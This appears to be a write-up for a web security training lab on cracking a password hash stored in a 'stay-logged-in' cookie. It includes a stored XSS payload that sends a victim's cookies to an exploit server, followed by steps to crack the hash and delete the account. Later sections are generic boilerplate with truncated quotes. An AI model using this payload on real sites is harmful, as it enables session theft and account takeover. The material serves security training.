# Offline password cracking

1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
1. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows: `username+':'+md5HashOfPassword`
1. You now need to steal the victim user's cookie.
Observe that the comment functionality is vulnerable to XSS.
1. Go to the exploit server and make a note of the URL.
1. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID: `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
1. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
1. Decode the cookie in Burp Decoder. The result will be: `carlos:26323c16d5f4dabff3bb136f2460a943`
1. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
1. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

### Note

The purpose of this lab is to demonstrate the potential of cracking passwords offline. Most likely, this would be done using a tool like hashcat, for example. When testing your clients' websites, we do not recommend submitting hashes of their real passwords in a search engine.

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to cra"

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could take over user accounts by brute-forcing passwords, bypass 2FA protections, enumerate valid usernames for targeted phishing, maintain persistent access via forged cookies, hijack OAuth flows, or reset any user's password.

### Detection / Testing Methodology

1. Test login responses for username enumeration (different messages/timing)
2. Test brute-force protections (IP blocking, account lockout, CAPTCHA)
3. Examine stay-logged-in cookies (decode, check if forgeable)
4. Test password reset flows (email injection, Host header manipulation)
5. For 2FA: test bypass via forced browsing, OTP brute-force, replay
6. For OAuth: test redirect_uri manipulation, access token theft

### Remediation

- Return identical error messages for all authentication failures ('Invalid credentials')
- Implement consistent response timing
- Use strong rate-limiting (per-account and per-IP)
- Require re-authentication for sensitive actions
- Use server-generated, unguessable password reset tokens
- For OAuth: validate redirect_uri against a strict allowlist, use state parameter
- For 2FA: enforce server-side, never skip via forced browsing

### Key Takeaways

- This lab demonstrates a authentication vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in "
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Return identical error messages for all authentication failures ('Invalid credentials')
